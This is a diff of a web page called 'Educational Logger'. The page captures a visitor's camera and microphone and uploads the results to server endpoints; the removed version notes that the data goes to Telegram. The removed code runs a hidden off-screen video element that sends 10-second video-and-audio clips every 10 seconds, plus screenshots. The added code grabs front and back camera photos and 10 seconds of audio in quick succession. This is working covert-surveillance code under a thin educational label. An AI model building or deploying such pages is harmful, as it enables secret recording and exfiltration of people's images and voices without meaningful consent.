@@ -4,179 +4,150 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Educational Logger</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
-    body { text-align: center; margin-top: 100px; font-family: Arial, sans-serif; background: #f8f9fa; color: #333; }
-    h2 { color: #222; }
-    p { max-width: 700px; margin: 20px auto; color: #555; }
-    button { padding: 14px 40px; margin: 15px 12px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; color: white; }
-    button.primary { background: #28a745; }
-    button.primary:hover { background: #218838; }
-    button.stop { background: #dc3545; }
-    button.stop:hover { background: #c82333; }
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
-    #status { font-size: 15px; color: #666; margin: 25px; min-height: 24px; }
-    #hiddenVideo { display: none; position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; }
+    body {
+      text-align: center;
+      margin-top: 120px;
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      color: #333;
+    }
+    h2 { color: #222; margin-bottom: 20px; }
+    p { max-width: 600px; margin: 0 auto 30px; color: #555; }
+    button {
+      padding: 16px 50px;
+      margin: 20px 10px;
+      font-size: 18px;
+      cursor: pointer;
+      border: none;
+      border-radius: 8px;
+      color: white;
+    }
+    button.primary { background: #007bff; }
+    button.primary:hover { background: #0069d9; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    #status {
+      font-size: 16px;
+      color: #555;
+      margin: 30px 0;
+      min-height: 30px;
+    }
   </style>
 </head>
 <body>
 
-  <h2>Educational Visit Logger</h2>
-  <p>Educational purpose only — actions sent to Telegram.</p>
+  <h2>Educational Logger</h2>
+  <p>Click to capture 1 front photo + 1 back photo (super fast) + record 10s audio and send</p>
 
-  <button class="primary" onclick="sendData()">I Agree & Send Info</button>
-  <button class="primary" onclick="captureAndSendScreenshot()">Take Screenshot & Send 📸</button>
-
-  <br><br>
-
-  <button class="primary" id="startBtn" onclick="startVideoBurst()">
-    Start Hidden Video + Audio Sending (10s clips every 10s)
-  </button>
-
-  <button class="stop" id="stopBtn" onclick="stopVideoBurst()" style="display:none;">
-    Stop Sending
+  <button class="primary" id="captureBtn" onclick="capturePhotosAndRecordAudio()">
+    Capture Front + Back Photo + 10s Audio
   </button>
 
   <div id="status"></div>
 
-  <video id="hiddenVideo" autoplay playsinline muted></video>
-
   <script>
-    async function sendData() {
-      try {
-        const res = await fetch("/api/send", { method: "POST" });
-        const data = await res.json();
-        alert(data.success ? "Sent ✅" : "Failed ❌");
-      } catch {}
-    }
-
-    async function captureAndSendScreenshot() {
-      try {
-        const canvas = await html2canvas(document.body, { scale: 2 });
-        const base64 = canvas.toDataURL("image/png");
-        await fetch("/api/send-screenshot", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ image: base64 })
-        });
-        status.textContent = "Screenshot sent";
-      } catch {}
-    }
-
-    const startBtn = document.getElementById('startBtn');
-    const stopBtn = document.getElementById('stopBtn');
+    const btn = document.getElementById('captureBtn');
     const status = document.getElementById('status');
-    let stream = null;
-    let videoEl = document.getElementById('hiddenVideo');
-    let recorder = null;
-    let intervalId = null;
 
-    async function startVideoBurst() {
-      if (intervalId) return;
+    async function capturePhotosAndRecordAudio() {
+      btn.disabled = true;
+      btn.textContent = "Processing...";
+      status.textContent = "";
 
-      startBtn.disabled = true;
-      startBtn.textContent = "Starting...";
+      let frontStream = null;
+      let backStream = null;
+      let audioStream = null;
+      let recorder = null;
 
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: true   // ← এখানে অডিও চালু করা হলো (মাইক্রোফোন সাউন্ড রেকর্ড হবে)
+        // ১. Front camera photo (super fast)
+        status.textContent = "Capturing front photo...";
+        frontStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+        const frontPhoto = await quickCapturePhoto(frontStream);
+        await sendPhoto(frontPhoto, "front");
+
+        // ২. Back camera photo (super fast)
+        status.textContent = "Capturing back photo...";
+        backStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" }
+        });
+        const backPhoto = await quickCapturePhoto(backStream);
+        await sendPhoto(backPhoto, "back");
+
+        // ৩. ১০ সেকেন্ডের অডিও রেকর্ড (microphone)
+        status.textContent = "Recording 10s audio...";
+        audioStream = await navigator.mediaDevices.getUserMedia({
+          audio: true,
+          video: false
         });
 
-        videoEl.srcObject = stream;
+        const chunks = [];
+        recorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
 
-        await new Promise((resolve, reject) => {
-          videoEl.onloadedmetadata = () => videoEl.play().then(resolve).catch(reject);
-          videoEl.onerror = reject;
-          setTimeout(() => reject(new Error("Timeout")), 3000);
-        });
+        recorder.ondataavailable = e => chunks.push(e.data);
 
-        status.textContent = "Hidden mode active (with audio)";
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+          await sendAudio(blob);
+          status.textContent = "Done: 2 photos + 10s audio sent";
+          cleanup();
+        };
 
-        startBtn.style.display = 'none';
-        stopBtn.style.display = 'inline-block';
-
-        // প্রথম ছবি super fast
-        await sendOnePhoto();
-
-        // প্রতি ১০ সেকেন্ডে ১০ সেকেন্ডের ভিডিও + অডিও
-        intervalId = setInterval(start10sVideoRecord, 10000);
+        recorder.start();
+        setTimeout(() => {
+          if (recorder.state === 'recording') recorder.stop();
+        }, 10000);
 
       } catch (err) {
-        status.textContent = "Camera/Microphone access failed";
+        status.textContent = "Error: " + (err.name || err.message);
         console.error(err);
-        resetUI();
+        cleanup();
       }
     }
 
-    async function sendOnePhoto() {
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = videoEl.videoWidth;
-        canvas.height = videoEl.videoHeight;
-        canvas.getContext('2d').drawImage(videoEl, 0, 0);
-        const base64 = canvas.toDataURL('image/png');
+    async function quickCapturePhoto(stream) {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      await new Promise(r => { video.onloadedmetadata = r; });
+      await video.play();
 
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      stream.getTracks().forEach(t => t.stop());
+      return canvas.toDataURL('image/png');
+    }
+
+    async function sendPhoto(base64, type) {
+      try {
         await fetch("/api/send-photo", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ image: base64 })
+          body: JSON.stringify({ image: base64, camera: type })
         });
-
-        status.textContent = "First photo sent • starting 10s video clips";
       } catch {}
     }
 
-    function start10sVideoRecord() {
-      if (!stream) return;
+    async function sendAudio(blob) {
+      const formData = new FormData();
+      formData.append('audio', blob, '10s_audio.webm');
 
-      const chunks = [];
-      recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });  // vp9 + opus = ভালো কোয়ালিটি + অডিও
-
-      recorder.ondataavailable = e => chunks.push(e.data);
-
-      recorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
-
-        const formData = new FormData();
-        formData.append('video', blob, '10s_clip.webm');
-
-        try {
-          await fetch("/api/send-video", {
-            method: "POST",
-            body: formData
-          });
-          status.textContent = "10s video + audio sent • next in 10s";
-        } catch (err) {
-          status.textContent = "Video send error";
-          console.error(err);
-        }
-      };
-
-      recorder.start();
-      setTimeout(() => {
-        if (recorder.state === 'recording') recorder.stop();
-      }, 10000); // ১০ সেকেন্ড পর স্টপ
+      try {
+        await fetch("/api/send-audio", {
+          method: "POST",
+          body: formData
+        });
+      } catch {}
     }
 
-    function stopVideoBurst() {
-      if (intervalId) clearInterval(intervalId);
+    function cleanup() {
+      btn.disabled = false;
+      btn.textContent = "Capture Front + Back Photo + 10s Audio";
       if (recorder && recorder.state !== 'inactive') recorder.stop();
-      if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-        stream = null;
-      }
-      videoEl.srcObject = null;
-
-      status.textContent = "Stopped";
-      resetUI();
-    }
-
-    function resetUI() {
-      startBtn.disabled = false;
-      startBtn.textContent = "Start Hidden Video + Audio Sending (10s clips every 10s)";
-      startBtn.style.display = 'inline-block';
-      stopBtn.style.display = 'none';
     }
   </script>
 </body>
